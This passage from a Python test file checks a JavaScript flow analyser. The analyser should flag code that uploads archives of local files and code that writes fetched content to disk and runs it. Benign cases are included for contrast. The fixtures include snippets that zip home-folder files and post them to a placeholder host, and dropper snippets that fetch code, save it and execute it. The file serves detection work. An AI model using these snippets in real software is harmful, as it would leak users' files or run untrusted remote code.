            'require("https").request({ hostname: "h.invalid" }).end(zip.toBuffer());\n'
        ),
        "home zipped to local disk (not a send)": (
            'const AdmZip = require("adm-zip");\nconst os = require("os");\n'
            'const zip = new AdmZip();\nzip.addLocalFolder(os.homedir());\nzip.writeZip("/tmp/b.zip");\n'
        ),
        "an empty archive uploaded": (
            'const JSZip = require("jszip");\nasync function go() {\n  const zip = new JSZip();\n'
            '  const b = await zip.generateAsync({ type: "nodebuffer" });\n'
            '  await fetch("https://h.invalid/u", { method: "POST", body: b });\n}\n'
        ),
    }

    @pytest.mark.parametrize("name", sorted(SENT))
    def test_an_archive_of_local_files_is_sent(self, name: str) -> None:
        code, want = self.SENT[name]
        pairs = [(s, k) for s, k, _ in FlowKit.flows(code)]
        assert (sorted(want), "request") in pairs

    @pytest.mark.parametrize("name", sorted(QUIET))
    def test_a_benign_archive_is_quiet(self, name: str) -> None:
        sensitive = {"home_file", "secret_file"}
        assert not [f for f in FlowKit.flows(self.QUIET[name]) if sensitive & set(f[0])]


class TestDroppedThenRun:
    """A response written to a file and then run from disk is a dropper: the written path carries
    `network_response`, so running it (`exec`, `require`) is network_response -> process/execute,
    which the REMOTE_CODE rule reads. A write never run, or a local file run, stays quiet
    (review 98 round 2 B)."""

    SENT: ClassVar[dict[str, str]] = {
        "writeFileSync(response) then execSync(path)": (
            'const fs = require("fs");\nconst cp = require("child_process");\nconst ax = require("axios");\n'
            "async function go() {\n"
            '  const p = require("path").join(require("os").tmpdir(), "x.js");\n'
            '  fs.writeFileSync(p, (await ax.get("https://h.invalid/a")).data);\n'
            "  cp.execSync(p);\n}\n"
        ),
        "fetched text written then require(path)": (
            'const fs = require("fs");\n'
            "async function go() {\n"
            '  const r = await fetch("https://h.invalid/a");\n'
            '  const tmp = "/tmp/m.js";\n'
            "  fs.writeFileSync(tmp, await r.text());\n"
            "  require(tmp);\n}\n"
        ),
    }
    QUIET: ClassVar[dict[str, str]] = {
        "a response written but never run": (
            'const fs = require("fs");\nconst ax = require("axios");\n'
            'async function go() {\n  const p = "/tmp/x";\n'
            '  fs.writeFileSync(p, (await ax.get("https://h.invalid/a")).data);\n  console.log(p);\n}\n'
        ),
        "local content written then run": (
            'const fs = require("fs");\nconst cp = require("child_process");\n'
            'const p = "/tmp/x.sh";\nfs.writeFileSync(p, "#!/bin/sh\\necho hi");\ncp.execSync(p);\n'
        ),
        "a plain require of a package": 'const x = require("lodash");\nx.map([], () => {});\n',
    }

    @pytest.mark.parametrize("name", sorted(SENT))
    def test_a_written_response_run_from_disk_is_a_dropper(self, name: str) -> None:
        got = [(s, k) for s, k, _ in FlowKit.flows(self.SENT[name])]
        assert [p for p in got if "network_response" in p[0] and p[1] in ("process", "execute")]

    @pytest.mark.parametrize("name", sorted(QUIET))
    def test_a_non_dropper_write_or_run_is_quiet(self, name: str) -> None:
        got = [(s, k) for s, k, _ in FlowKit.flows(self.QUIET[name])]
        assert not [p for p in got if "network_response" in p[0] and p[1] in ("process", "execute")]
